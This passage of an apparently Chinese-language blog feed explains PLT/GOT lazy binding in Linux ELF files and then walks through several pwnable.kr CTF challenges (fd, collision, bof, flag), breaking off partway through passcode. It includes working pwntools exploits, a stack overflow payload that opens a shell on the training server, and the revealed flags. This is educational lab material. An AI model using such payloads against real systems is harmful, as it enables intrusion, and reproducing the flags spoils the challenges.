&lt;0x804a00c&gt;</code>这条指令的意思是取出<code>puts@got.plt</code>表中的值，放到pc寄存器中</p><p>所以？查看一下此处内存的值：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2x 0x804a00c</span><br><span class="line">0x804a00c &lt;puts@got.plt&gt;:0x080483160x08048326</span><br></pre></td></tr></table></figure></p><p>所以下一条指令的地址就是<code>0x08048316</code>还是在plt表中</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048316  &lt;puts@plt+6&gt;                push   0</span><br><span class="line">  0x804831b  &lt;puts@plt+11&gt;               jmp    0x8048300</span><br></pre></td></tr></table></figure></p><p>这里先将0放到栈上，表明是要解析puts函数的地址，然后再跳转到<code>0x8048300</code>也就是plt表的开始部分</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048300                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">  0x8048306                              jmp    dword ptr [0x804a008] &lt;0xf7ff0650&gt;</span><br></pre></td></tr></table></figure></p><p>这时候先把.got.plt表中的第二项放到栈上先查看一下.got.plt中前三项的内容:</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3x 0x804a000</span><br><span class="line">0x804a000:0x08049f140xf7ffd9380xf7ff0650</span><br></pre></td></tr></table></figure></p><p>将<code>0xf7ffd938</code>放置到栈上，然后跳转到.got.plt中的第三项，也就是<code>0xf7ff0650</code>，这个地址就是<code>_dl_runtime_resolve</code>函数的地址负责解析函数的地址</p><p>此时我们的got表内容如下：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT functions: 4</span><br><span class="line"></span><br><span class="line">[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) ◂— push   0 /* &apos;h&apos; */</span><br><span class="line">[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push   8</span><br><span class="line">[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push   0x10</span><br><span class="line">[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push   ebp</span><br></pre></td></tr></table></figure></p><p>puts函数的地址还没有重定位</p><p>当我们执行过一遍puts函数之后这时候回过头来继续查看got表中的内容：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT functions: 4</span><br><span class="line"></span><br><span class="line">[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push   ebp</span><br><span class="line">[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push   8</span><br><span class="line">[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push   0x10</span><br><span class="line">[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push   ebp</span><br></pre></td></tr></table></figure></p><p>可以看到地址已经重定位好了</p><p>这和Windows的PE文件格式似乎有点不同了，PE文件是装载进内存之后函数地址都已经重定位好了，而Linux的elf文件刚刚装进内存之后函数的地址还是不确定的，需要在运行的时候进行重定位。</p><p>当我们将代码修改为如下时：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; l <span class="number">1</span>, <span class="number">20</span></span><br><span class="line"><span class="comment">// Build with: gcc -m32 -no-pie -g -o plt plt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello world!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hello world again !!!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第一次调用<code>puts</code>函数之后：<code>[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push ebp</code></p><p>puts函数地址已经重定位好了</p><p>接下来再次调用puts函数</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048310  &lt;puts@plt&gt;    jmp    dword ptr [0x804a00c] &lt;0xf7e727e0&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0xf7e727e0 &lt;puts&gt;        push   ebp</span><br><span class="line">  0xf7e727e1 &lt;puts+1&gt;      push   edi</span><br><span class="line">  0xf7e727e2 &lt;puts+2&gt;      push   esi</span><br><span class="line">  0xf7e727e3 &lt;puts+3&gt;      push   ebx</span><br></pre></td></tr></table></figure></p><p>此时可以看到直接就跳到函数的地址了因为此时的.got.plt已经是puts函数的地址了， Linux tql</p><h1>整理一下</h1><p>之前看参考资料中博主的文章一直没有很理解，这里直接统一说一下我的理解：</p><h2>何谓PLT与GOT</h2><p>其实这里准确的来说应该叫got.plt而不是叫got，不过为了方便我们还是叫它got表吧</p><p><img src="/assets/got0_bmqvjb601" alt="got0">要注意那个<code>jmp *printf@got</code> *号是取出地址处的值，并不是跳到got表中去</p><h2>延迟重定位</h2><p>这篇文章我觉得写的很精彩</p><p>Linux为了缩减代码,就是按照这种模式来的：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got            <span class="comment">// 链接器将printf@got填成下一语句lookup_printf的地址</span></span><br><span class="line"></span><br><span class="line">lookup_printf:</span><br><span class="line">        调用重定位函数查找<span class="built_in">printf</span>地址，并写到<span class="built_in">printf</span>@got</span><br><span class="line"></span><br><span class="line">        <span class="keyword">goto</span> address_good;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>也就和上面那张图是一一对应的</p><h2>公共got表项</h2><p>在解析函数的真正地址时， <code>_dl_runtime_resolve</code>是怎么知道它要解析哪个函数的</p><p>因为：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf@plt&gt;:</span><br><span class="line">   jmp *0x80496f8</span><br><span class="line">   push $0x00</span><br><span class="line">   jmp common@plt</span><br></pre></td></tr></table></figure></p><p>这里push的值不一样，相当于就是每个函数取了一个id</p><p>之后就是公共got表的内容：</p><ul><li>got[0]: 本ELF动态段(.dynamic段）的装载地址</li><li>got[1]：本ELF的link_map数据结构描述符地址</li><li>got[2]：_dl_runtime_resolve函数的地址</li></ul><h2>穿针引线</h2><p><img src="/assets/got1_8tzb6jmh9" alt="got1"></p><blockquote><p>PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）每项PLT都从对应的GOT表项中读取目标函数地址</p></blockquote><blockquote><p>GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充</p></blockquote><h1>参考</h1><p><a href="https://blog.csdn.net/linyt/article/details/51635768?from=singlemessage" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><a href="https://blog.csdn.net/linyt/article/details/51636753" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位</a><a href="https://blog.csdn.net/linyt/article/details/51637832" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项</a><a href="https://blog.csdn.net/linyt/article/details/51893258" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（4）—— 穿针引线</a><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noopener">GOT and PLT for pwning.</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;深入理解plt和got&lt;/h1&gt;
&lt;p&gt;先写一段代码：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span c
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="pwn" scheme="https://prontosil.club/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable</title>
    <link href="https://prontosil.club/2019/07/24/pwnable/"/>
    <id>https://prontosil.club/2019/07/24/pwnable/</id>
    <published>2019-07-24T12:46:03.000Z</published>
    <updated>2019-07-24T12:49:36.285Z</updated>
    
    <content type="html"><![CDATA[<h1>pwnable从小白开始</h1><p>pwnable是一个适合小白的网站</p><p>https://pwnable.kr/play.php</p><h2>fd</h2><p>有源码：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这道题目是让你了解Linux下的文件描述符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@prowl:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br><span class="line">fd@prowl:~$</span><br></pre></td></tr></table></figure></p><h2>collision</h2><p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>果然我还是小白，连最基本的常识都不懂了，意识到了是由输入的<code>argv[1]</code>来计算的，20个字节正好分成5次，就是把每四个加起来就行了。</p><p>所以可以直接拿<code>0x21DD09EC</code>去除掉5就好了exp如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn_ssh=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'col'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">print(pwn_ssh.connected())</span><br><span class="line"></span><br><span class="line">sh=pwn_ssh.process(argv=[<span class="string">'collision'</span>,<span class="string">'\xc9\xce\xc5\x06'</span>*<span class="number">4</span>+<span class="string">'\xc8\xce\xc5\x06'</span>],executable=<span class="string">'./col'</span>)</span><br><span class="line">print(sh.recvall())</span><br></pre></td></tr></table></figure></p><p>这里还学到了一波用<code>pwn</code>ssh连接的。</p><h2>bof</h2><p>源码：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是一个简单的栈溢出的题目虽然简单，但是小白还是要仔细地分析一下的。</p><p>func对应的汇编代码，其实感觉汇编代码看的更明白一些：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:565D262C func            proc near               ; CODE XREF: main+10p</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C s               = byte ptr -2Ch</span><br><span class="line">.text:565D262C var_C           = dword ptr -0Ch</span><br><span class="line">.text:565D262C arg_0           = dword ptr  8</span><br><span class="line">.text:565D262C</span><br><span class="line">.text:565D262C                 push    ebp</span><br><span class="line">.text:565D262D                 mov     ebp, esp</span><br><span class="line">.text:565D262F                 sub     esp, 48h</span><br><span class="line">.text:565D2632                 mov     eax, large gs:14h ;gs保护机制</span><br><span class="line">.text:565D2638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:565D263B                 xor     eax, eax</span><br><span class="line">.text:565D263D                 mov     dword ptr [esp], offset s ; &quot;overflow me : &quot;</span><br><span class="line">.text:565D2644                 call    near ptr puts+565D2649h</span><br><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br><span class="line">.text:565D264F                 call    near ptr gets+565D2654h</span><br><span class="line">.text:565D2654                 cmp     [ebp+arg_0], 0CAFEBABEh</span><br><span class="line">.text:565D265B                 jnz     short loc_565D266B</span><br><span class="line">.text:565D265D                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:565D2664                 call    near ptr system+565D2669h</span><br><span class="line">.text:565D2669                 jmp     short loc_565D2677</span><br></pre></td></tr></table></figure></p><p>之前一直不太明白如果局部变量是数组该怎么搞</p><p>关键是这里：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:565D2649                 lea     eax, [ebp+s]</span><br><span class="line">.text:565D264C                 mov     [esp], eax      ; s</span><br></pre></td></tr></table></figure></p><p>注意<code>lea eax, [ebp+s]</code>这里加了方括号但是其实还是地址，就是将字符串s的地址赋值给eax然后再将其存放到栈顶，之后调用<code>gets</code>函数，将输入的值填入到缓冲区</p><p>从这张图就能明白内存的分布了<img src="/assets/stack2_l89iia1d5.png" alt="stack2">这道题目保护机制基本都开了，但是我们并不需要执行代码。只需要覆盖栈上的值就行了。也不会触发gs保护机制</p><p>exp如下：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">52</span>+<span class="string">'\xbe\xba\xfe\xca'</span></span><br><span class="line">r=remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">print(r.connected())</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>运行效果如下：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pxy@ubuntu:~/pwnable$ python bofexp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">True</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure></p><h2>flag</h2><p>这道题目被upx加壳，Linux下的加壳倒还是第一次遇到。</p><p>到<a href="https://github.com/upx/upx/releases/tag/v3.95" target="_blank" rel="noopener">这里</a>可以找到脱壳的工具</p><p>脱壳之后gdb载入，查看反汇编代码</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000401164 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x0000000000401165 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000401168 &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">   0x000000000040116c &lt;+8&gt;:mov    edi,0x496658</span><br><span class="line">   0x0000000000401171 &lt;+13&gt;:call   0x402080 &lt;puts&gt;</span><br><span class="line">   0x0000000000401176 &lt;+18&gt;:mov    edi,0x64</span><br><span class="line">   0x000000000040117b &lt;+23&gt;:call   0x4099d0 &lt;malloc&gt;</span><br><span class="line">   0x0000000000401180 &lt;+28&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401184 &lt;+32&gt;:mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &lt;flag&gt;</span><br><span class="line">   0x000000000040118b &lt;+39&gt;:mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x000000000040118f &lt;+43&gt;:mov    rsi,rdx</span><br><span class="line">   0x0000000000401192 &lt;+46&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000401195 &lt;+49&gt;:call   0x400320</span><br><span class="line">   0x000000000040119a &lt;+54&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040119f &lt;+59&gt;:leave  </span><br><span class="line">   0x00000000004011a0 &lt;+60&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; b *0x0000000000401184</span><br></pre></td></tr></table></figure></p><p>然后在此处下断点</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x6c96b0 ◂— 0x0</span><br><span class="line">RBX  0x401ae0 (__libc_csu_fini) ◂— push   rbx</span><br><span class="line">RCX  0x8</span><br><span class="line">RDX  0x496628 ◂— push   rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */</span><br><span class="line">RDI  0x4</span><br><span class="line">RSI  0x0</span><br><span class="line">R8   0x1</span><br><span class="line">R9   0x3</span><br><span class="line">R10  0x22</span><br></pre></td></tr></table></figure></p><p>命中断点之后单步一次就行这时候就看到寄存器的变化</p><p>flag就是那个拉2333</p><h2>paascode</h2><p>学到了一点从远程服务器下载东西的命令</p><p><code>$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode .</code></p><p>源码：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ cat passcode.c             </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span 